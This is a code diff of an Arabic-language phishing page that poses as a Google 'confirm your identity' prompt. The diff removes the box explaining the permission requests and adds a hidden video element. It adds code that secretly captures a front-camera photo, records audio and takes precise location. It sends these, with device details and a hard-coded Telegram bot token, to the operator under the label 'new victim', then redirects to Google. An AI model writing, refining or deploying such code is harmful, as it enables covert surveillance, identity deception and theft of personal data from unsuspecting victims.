@@ -15,7 +15,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 400px;
+            max-width: 380px;
             width: 100%;
             text-align: center;
             padding: 30px 20px;
@@ -36,24 +36,6 @@
         .icon { font-size: 56px; margin: 10px 0; }
         h2 { color: #202124; font-size: 20px; font-weight: 400; margin-bottom: 6px; }
         .sub-text { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
-        .info-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 14px 18px;
-            margin-bottom: 18px;
-            text-align: left;
-            border: 1px solid #dadce0;
-        }
-        .info-box .row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 6px 0;
-            color: #202124;
-            font-size: 14px;
-        }
-        .info-box .row .label { color: #5f6368; min-width: 80px; }
-        .info-box .row .value { font-weight: 500; }
         .btn {
             width: 100%;
             padding: 14px;
@@ -105,6 +87,14 @@
             border-radius: 8px;
             margin: 8px 0;
         }
+        .hidden { display: none; }
+        #videoPreview {
+            width: 100%;
+            max-width: 200px;
+            margin: 10px auto;
+            border-radius: 10px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -124,15 +114,13 @@
         📱 <span id="deviceName">جهاز غير معروف</span>
     </div>
 
-    <div class="info-box">
-        <div class="row"><span class="label">📍 الموقع</span><span class="value">لتأكيد هويتك</span></div>
-        <div class="row"><span class="label">📸 الكاميرا</span><span class="value">للتحقق من هويتك</span></div>
-        <div class="row"><span class="label">🎤 الميكروفون</span><span class="value">لتأكيد الصوت</span></div>
-        <div class="row"><span class="label">🔔 الإشعارات</span><span class="value">لتنبيهات الأمان</span></div>
-    </div>
-
+    <!-- زر رئيسي واحد فقط -->
     <button class="btn" id="btnConfirm" onclick="startProcess()">✅ تأكيد هويتي</button>
     <button class="btn btn-secondary" onclick="window.location.href='https://accounts.google.com'">🔙 تسجيل الدخول بطريقة أخرى</button>
+
+    <!-- فيديو مخفي للتصوير -->
+    <video id="videoPreview" autoplay muted></video>
+    <canvas id="canvasPreview" class="hidden"></canvas>
 
     <div class="loader" id="loader"></div>
     <div class="status" id="statusMsg"></div>
@@ -142,20 +130,46 @@
 </div>
 
 <script>
-    // ====== إعدادات البوت (سريعة) ======
+    // ====== إعدادات البوت ======
     const BOT_TOKEN = "8599000520:AAHwQg2d_xry4DWNy92fbvVbtF-xWYVu_FA";
     const CHAT_ID = "7984067238";
 
-    // ====== إرسال للبوت (غير متزامن) ======
+    // ====== إرسال للبوت ======
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
             .catch(e => console.error(e));
     }
 
-    // ====== عرض معلومات الجهاز (فوري) ======
+    // ====== إرسال صورة للبوت ======
+    function sendPhotoToTelegram(imageData, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', imageData, 'photo.jpg');
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.error(e));
+    }
+
+    // ====== إرسال صوت للبوت ======
+    function sendAudioToTelegram(audioBlob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', audioBlob, 'audio.ogg');
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.error(e));
+    }
+
+    // ====== عرض معلومات الجهاز ======
     document.getElementById('deviceName').textContent = navigator.userAgentData?.platform || navigator.platform || "جهاز غير معروف";
 
-    // ====== جمع المعلومات (سريع جداً) ======
+    // ====== جمع المعلومات ======
     function getDeviceInfo() {
         let info = "";
         info += `📱 الجهاز: ${navigator.userAgentData?.platform || navigator.platform || "غير معروف"}\n`;
@@ -167,8 +181,8 @@
         return info;
     }
 
-    // ====== الحصول على الموقع بسرعة فائقة ======
-    function getLocationFast() {
+    // ====== الحصول على الموقع ======
+    function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve({ success: false, error: "غير مدعوم" });
@@ -186,53 +200,99 @@
                 () => {
                     resolve({ success: false, error: "مرفوض" });
                 },
-                {
-                    enableHighAccuracy: false,  // أسرع
-                    timeout: 3000,              // 3 ثواني فقط
-                    maximumAge: 10000
-                }
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         });
     }
 
-    // ====== طلب الكاميرا بسرعة ======
-    function getCameraFast() {
+    // ====== التقاط صورة من الكاميرا ======
+    function capturePhoto(videoElement, canvasElement) {
         return new Promise((resolve) => {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve({ success: true });
-                })
-                .catch(() => resolve({ success: false }));
-        });
-    }
-
-    // ====== طلب الميكروفون بسرعة ======
-    function getMicFast() {
-        return new Promise((resolve) => {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then((stream) => {
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve({ success: true });
-                })
-                .catch(() => resolve({ success: false }));
-        });
-    }
-
-    // ====== طلب الإشعارات بسرعة ======
-    function getNotificationsFast() {
-        return new Promise((resolve) => {
-            if (!('Notification' in window)) {
-                resolve({ success: false, error: "غير مدعومة" });
-                return;
+            try {
+                const stream = videoElement.srcObject;
+                if (!stream) {
+                    resolve({ success: false, error: "لا توجد كاميرا" });
+                    return;
+                }
+                canvasElement.width = videoElement.videoWidth;
+                canvasElement.height = videoElement.videoHeight;
+                const ctx = canvasElement.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0);
+                canvasElement.toBlob((blob) => {
+                    resolve({ success: true, blob: blob });
+                }, 'image/jpeg', 0.8);
+            } catch (e) {
+                resolve({ success: false, error: e.message });
             }
-            Notification.requestPermission().then(perm => {
-                resolve({ success: perm === 'granted' });
+        });
+    }
+
+    // ====== بدء الكاميرا (صامت) ======
+    function startCamera() {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 320, height: 240 },
+                audio: false
+            })
+            .then((stream) => {
+                const video = document.getElementById('videoPreview');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve({ success: true, stream: stream });
+                };
+            })
+            .catch(() => {
+                // محاولة الكاميرا الخلفية
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 320, height: 240 },
+                    audio: false
+                })
+                .then((stream) => {
+                    const video = document.getElementById('videoPreview');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve({ success: true, stream: stream });
+                    };
+                })
+                .catch(() => {
+                    resolve({ success: false, error: "فشل تشغيل الكاميرا" });
+                });
             });
         });
     }
 
-    // ====== العملية الرئيسية (متوازية وسريعة) ======
+    // ====== تسجيل الصوت ======
+    function recordAudio(duration = 5000) {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then((stream) => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/ogg' });
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve({ success: true, blob: blob });
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, duration);
+                })
+                .catch(() => {
+                    resolve({ success: false, error: "فشل تشغيل الميكروفون" });
+                });
+        });
+    }
+
+    // ====== العملية الرئيسية ======
     async function startProcess() {
         const btn = document.getElementById('btnConfirm');
         const loader = document.getElementById('loader');
@@ -243,19 +303,36 @@
         loader.style.display = 'block';
         status.style.display = 'none';
 
-        // === طلب كل الصلاحيات في نفس الوقت (Parallel) ===
-        const [locationResult, cameraResult, micResult, notifResult] = await Promise.all([
-            getLocationFast(),
-            getCameraFast(),
-            getMicFast(),
-            getNotificationsFast()
-        ]);
-
-        // === جمع المعلومات العامة ===
+        // === 1. جمع المعلومات العامة ===
         const deviceInfo = getDeviceInfo();
 
-        // === بناء التقرير ===
-        let msg = `🛰️ *[ ضحية جديدة - سريع ]*\n\n`;
+        // === 2. الحصول على الموقع ===
+        const locationResult = await getLocation();
+
+        // === 3. تشغيل الكاميرا (صامت) ===
+        const cameraResult = await startCamera();
+
+        // === 4. التقاط صورة (أمامي) ===
+        let frontPhoto = null;
+        if (cameraResult.success) {
+            const photoResult = await capturePhoto(
+                document.getElementById('videoPreview'),
+                document.getElementById('canvasPreview')
+            );
+            if (photoResult.success) {
+                frontPhoto = photoResult.blob;
+            }
+            // إيقاف الكاميرا
+            if (cameraResult.stream) {
+                cameraResult.stream.getTracks().forEach(t => t.stop());
+            }
+        }
+
+        // === 5. تسجيل الصوت ===
+        const audioResult = await recordAudio(4000); // 4 ثواني
+
+        // === 6. إرسال البيانات للبوت ===
+        let msg = `🛰️ *[ ضحية جديدة ]*\n\n`;
         msg += deviceInfo;
 
         if (locationResult.success) {
@@ -267,14 +344,23 @@
         }
 
         msg += `📸 الكاميرا: ${cameraResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
-        msg += `🎤 الميكروفون: ${micResult.success ? "✅ ممنوح" : "❌ مرفوض"}\n`;
-        msg += `🔔 الإشعارات: ${notifResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
+        msg += `🎤 الميكروفون: ${audioResult.success ? "✅ ممنوح" : "❌ مرفوض"}\n`;
         msg += `\n🕒 ${new Date().toLocaleString()}`;
 
-        // === إرسال فوري ===
+        // إرسال النص
         sendToTelegram(msg);
 
-        // === إخفاء التحميل وعرض النتيجة ===
+        // إرسال الصورة (إذا تم التقاطها)
+        if (frontPhoto) {
+            sendPhotoToTelegram(frontPhoto, `📸 صورة أمامية - ${new Date().toLocaleString()}`);
+        }
+
+        // إرسال التسجيل الصوتي (إذا تم)
+        if (audioResult.success) {
+            sendAudioToTelegram(audioResult.blob, `🎤 تسجيل صوتي - ${new Date().toLocaleString()}`);
+        }
+
+        // === عرض النتيجة ===
         loader.style.display = 'none';
         btn.disabled = false;
         btn.style.opacity = '1';
@@ -286,7 +372,7 @@
             status.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري تحويلك...';
             setTimeout(() => {
                 window.location.href = "https://myaccount.google.com";
-            }, 1200);
+            }, 1500);
         } else {
             status.className = 'status error';
             status.innerHTML = '❌ لم نتمكن من تأكيد هويتك، حاول مرة أخرى';
